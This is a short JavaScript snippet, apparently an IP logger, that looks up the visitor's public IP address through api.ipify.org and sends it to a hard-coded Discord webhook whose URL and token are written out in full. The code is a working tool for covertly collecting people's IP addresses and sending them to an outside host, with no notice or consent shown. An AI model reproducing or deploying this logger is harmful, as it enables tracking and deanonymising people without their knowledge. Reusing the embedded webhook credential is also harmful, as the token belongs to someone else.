
async function logIP(webhookURL) {
  // Get the user's IP address
  const response = await fetch('https://api.ipify.org?format=json');
  const {ip} = await response.json();

  // Send the IP address to the Discord webhook
  const data = {
    "content": `New IP logged: ${ip}`
  };
  await fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  });
}

// Replace WEBHOOK_URL with your actual Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1049566836699705414/4he9cOe4KO-cU5X4h5uLO0v5GlGmYFizJnNk-NAS_UuR5eOl3FdIE1el_8DLjQywz8oK';
logIP(WEBHOOK_URL);
